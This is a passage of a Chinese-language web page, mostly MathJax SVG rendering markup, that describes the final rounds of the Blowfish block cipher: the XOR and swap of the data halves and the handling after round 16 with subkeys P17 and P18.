data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>异或，结果设为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="4.075ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1801.2 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="TeXAtom" transform="translate(861,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mn" transform="translate(759,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>。<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.95ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1746.1 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="TeXAtom" transform="translate(861,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mn" transform="translate(681,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="4.075ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1801.2 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="TeXAtom" transform="translate(861,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mn" transform="translate(759,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>调换位置后即为下一轮的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.151ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1392.5 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1447.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>。</p>
</li>
<li><p>  <strong>第16轮结束后<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.151ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1392.5 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1447.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>不需调换位置</strong>。将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.151ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1392.5 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="3.24ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 1432.1 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>异或后的结果拼接上<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1447.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="3.24ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 1432.1 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path 